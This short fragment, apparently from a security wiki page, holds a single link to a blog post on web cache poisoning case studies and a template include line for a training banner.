- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
